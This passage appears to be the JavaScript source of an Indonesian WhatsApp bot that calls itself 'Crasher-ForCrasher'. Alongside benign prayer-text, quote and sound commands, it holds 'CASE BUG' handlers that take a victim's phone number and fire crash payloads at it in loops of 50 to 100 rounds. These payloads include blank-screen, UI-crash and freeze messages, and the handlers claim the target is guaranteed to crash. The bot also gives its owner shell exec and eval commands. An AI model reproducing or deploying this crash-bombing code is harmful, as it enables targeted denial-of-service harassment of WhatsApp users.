 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
let contoh = `*「 Bacaan Shalat 」*\n\n`
reply(`${contoh} + ${data}`)
}
break
 
case 'niatsholat': {
if (!q) return reply(`*Contoh:*\nniatsholat isya\n\n*SHOLAT*\nisya\nSubuh\ndzuhur\nashar\nmaghrib`)
const niatsholat = [
{
index: 1,
solat: "subuh",
latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 2,
solat: "maghrib",
latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 3,
solat: "dzuhur",
latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 4,
solat: "isya",
latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 5,
solat: "ashar",
latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
}
]
let text = q.toLowerCase() || ''
let data = Object.values(niatsholat).find(v => v.solat == text)
if (!data) return reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break 
//=================================\\    // Quotes islam    
case 'quotesisl1ami': 
case 'quote1sislam':
case 'quotesisla1mic':{
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": "6",
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
 "id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
reply(`${arabic}\n${arti}`)
}
break  
        
 //=================================\\   //SOUND   
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
koi = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await lubyz.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break  
//=================================\\     // CEK MENU  
case 'sanzek':
case 'ceksxe':
case 'gbxk':
case 'cay':
case 'cg':
case 'cekcik':
case 'cekkaa':
case 'lesk':
case 'cebi':
case 'ceol':
case 'cer':{
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var sangek = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
var sange = sangek[Math.floor(Math.random() * sangek.length)]
var expired = ['1 januari 2026', '2 maret 2026', '12 mei 2030', '30 Agustus 2029','15 agustus 2028', '17 Desember 2027', '18 april 2029', '25 juni 2031', '3 juli 2032', '4 September 2033', 'Hari Kiamat', '17 Agustus 2040', '17 oktober 2045', '15 maret 2050', '27 mei 2037', '20 Agustus 2034', '20 September 2035']
var expired = expired[Math.floor(Math.random() * expired.length)]
reply(`Nama : *${q}*\nJawaban : *${sange}%*\nKADALUARSA :*${expired}*`)
}
break
        
case 'apxzxs': {
if (!text) return reply( `Example : ${prefix + command} dia bisa kembali`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih iya', 'Betul']
var kah = apa[Math.floor(Math.random() * apa.length)]
var expired = ['2026', '2027', '2028', '2029', '2030', 'hari kiamat']
var exp = expired[Math.floor(Math.random() * expired.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : *${kah}*\nExpired : *${exp}*`) 
}
break 
        
        
        
        
        
//====================================\\
      // BASE ORI LUBYZ
case 'sc': case 'script':
reply(`
Haii @${m.sender.split("@")[0]} 👋\nScript ini dibagikan secara gratis, silahkan unduh jika ingin menggunakan.

*INFO UPDATE SCRIPT*
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U
`) 
break
 //==============================\\
 case 'credits':{
await lubyz.sendMessage(from, {react: {text: "⏳", key: m.key}}); await sleep(500)
const text12 = `
*CREDITS SCRIPTBOT*
Lubzy <Developer Script>
JustinOfficial <Partner>

*INFO UPDATE SCRIPT*
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U
`

await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/lcg8b5.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟒",
                    newsletterJid: `120363395171754055@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟔.𝟎.𝟎`
                     ,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/lcg8b5.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U`
                }
            }
        },{ quoted: qloc }
     )
  }
 break;
//===================================//
 case 'tqto': case 'credit': case 'tq': case 'thanks':
reply(`
𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢💥
𝗠𝗮𝗿𝘅𝗠𝗼𝗱𝘀 <𝗧𝗮𝗻𝗴𝗮𝗻 𝗸𝗮𝗻𝗮𝗻>
𝗕𝗮𝗺𝗺𝗢𝗳𝗳𝗰 <𝗧𝗮𝗻𝗴𝗮𝗻 𝗸𝗮𝗻𝗮𝗻>
𝗝𝘂𝘀𝘁𝗶𝗻𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 <𝗙𝗿𝗶𝗲𝗻𝗱𝘀>
𝗗𝗮𝗻 𝗸𝗮𝗹𝗶𝗮𝗻 𝘆𝗮𝗻𝗴 𝘀𝘂𝗱𝗮𝗵 𝗺𝗲𝗺𝗮𝗸𝗮𝗶 𝘀𝗰𝗿𝗶𝗽𝘁 𝗻𝘆𝗮𝗮

*INFO UPDATE SCRIPT*
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕
`)
break      
   //BASE ORI LUBYZ
//===============================// 
      //BASE ORI LUBYZ
 
// CASE BUG 
case 'ui':
case 'crash-home':
case 'infinity':
case 'blank':
case 'hardui':
case 'crasher-forclose': {
if (!isCmd) return;
if (!Access && !isPremium) return reply(msg.premium)
if (!q) return reply(`*Example :*${prefix + command} 62×××`)
await reply(mess.sendbug)   
let bahan = q.replace(/[^0-9]/g,'')
let target = bahan + '@s.whatsapp.net'
await lubyz.sendMessage(from, {react: {text: "🔃", key: m.key}})
// sending bug 
for (let i = 0; i < 100; i++) {
await Sletter1(target)
await sleep(500)
await zzy_notif(target)
await sleep(500) 
await BlankScreen(target, ptcp = true) 
await sleep(500)
await crashui2(target, ptcp = true)
await sleep(1000) 
await trashloc(target)
await sleep(1000)
await killui(target, Ptcp = true)
await sleep(1000) 
await FrezeeMsg1(target)
await sleep(1000) 
await FrezeeMsg2(target)
await sleep(1000) 
await BlankScreen(target, ptcp = true) 
await sleep(1000) 

}
await lubyz.sendMessage(from, {react: {text: "✅", key: m.key}})
return reply(`Bug Sukses Terkirim!
> Cek Target Dijamin C1`)
}
break  
        
// CASE BUG 
case 'crasher-forcrasher':
case 'lubyzxcrasher':
case 'mode-merusak':
case 'infinity':
case 'crot':
case 'crot-hard': {
if (!isCmd) return;
if (!Access && !isPremium) return reply(msg.premium)
if (!q) return reply(`*Example :*${prefix + command} 62×××`)
await reply(mess.sendbug)   
let bahan = q.replace(/[^0-9]/g,'')
let target = bahan + '@s.whatsapp.net'
await lubyz.sendMessage(from, {react: {text: "🔃", key: m.key}})
// sending bug 
for (let i = 0; i < 100; i++) {
await Sletter1(target)
await sleep(500)
await zzy_notif(target)
await sleep(500) 
await BlankScreen(target, ptcp = true) 
await sleep(500)
await crashui2(target, ptcp = true)
await sleep(1000)
await BlankScreen(target, ptcp = true)

}
await lubyz.sendMessage(from, {react: {text: "✅", key: m.key}})
return reply(`Bug Sukses Terkirim!
> Cek Target Dijamin C1`)
}
break  
        
// CASE BUG 
case 'crasher-forcrasher':
case 'lubyzxcrasher':
case 'mode-merusak':
case 'c1-dek':
case 'wkwkwkk':
case 'wkwkkwkww': {
if (!isCmd) return;
if (!Access && !isPremium) return reply(msg.premium)
if (!q) return reply(`*Example :*${prefix + command} 62×××`)
await reply(mess.sendbug)   
let bahan = q.replace(/[^0-9]/g,'')
let target = bahan + '@s.whatsapp.net'
await lubyz.sendMessage(from, {react: {text: "🔃", key: m.key}})
// sending bug 
for (let i = 0; i < 50; i++) {
await Sletter1(target)
await sleep(500)
await zzy_notif(target)
await sleep(500)
await crashui2(target, ptcp = true)
await sleep(1000)
await BlankScreen(target, ptcp = true)
await sleep(1000) 
await crashui2(target, ptcp = true)  
}
await lubyz.sendMessage(from, {react: {text: "✅", key: m.key}})
return reply(`Bug Sukses Terkirim!
> Cek Target Dijamin C1`)
}
break   
 
 // CASE BUG 
case 'crasher-forcrasher':
case 'lubyzxcrasher':
case 'mode-merusak':
case 'wkkwk':
case 'wkwkkwkw':
case 'wkwkwk': {
if (!isCmd) return;
if (!Access && !isPremium) return reply(msg.premium)
if (!q) return reply(`*Example :*${prefix + command} 62×××`)
await reply(mess.sendbug)   
let bahan = q.replace(/[^0-9]/g,'')
let target = bahan + '@s.whatsapp.net'
await lubyz.sendMessage(from, {react: {text: "🔃", key: m.key}})
// sending bug 
for (let i = 0; i < 55; i++) {
await Sletter1(target) 
await sleep(1000) 
await zzy_notif(target)
await sleep(1000) 
await BlankScreen(target, ptcp = true)
await sleep(1000) 
await crashui2(target, ptcp = true) 
await sleep(1000)
}
await lubyz.sendMessage(from, {react: {text: "✅", key: m.key}})
return reply(`Bug Sukses Terkirim!
> Cek Target Dijamin C1`)
}
break   

//BUG EMOJI        
case '😎':
case '🥱':
case '🤨':
case '💥':
case '🍌':
case '🗿': {
if (!isCmd) return;
if (!Access && !isPremium) return reply(msg.premium)
if (!q) return reply(`*Example :*${prefix + command} 62×××`)
await reply(mess.sendbug)   
let bahan = q.replace(/[^0-9]/g,'')
let target = bahan + '@s.whatsapp.net'
await lubyz.sendMessage(from, {react: {text: "🔃", key: m.key}})
// sending bug 
for (let i = 0; i < 100; i++) {
await Sletter1(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
await crashui2(target, ptcp = true)
await BlankScreen(target, ptcp = true) 
await zzy_notif(target)

}
await lubyz.sendMessage(from, {react: {text: "✅", key: m.key}})
return reply(`Bug Sukses Terkirim!
> Cek Target Dijamin C1`)
}
break 
      
 

//==============================\\ 
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return lubyz.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return lubyz.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
lubyz.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
lubyz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return lubyz.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return lubyz.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
lubyz.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})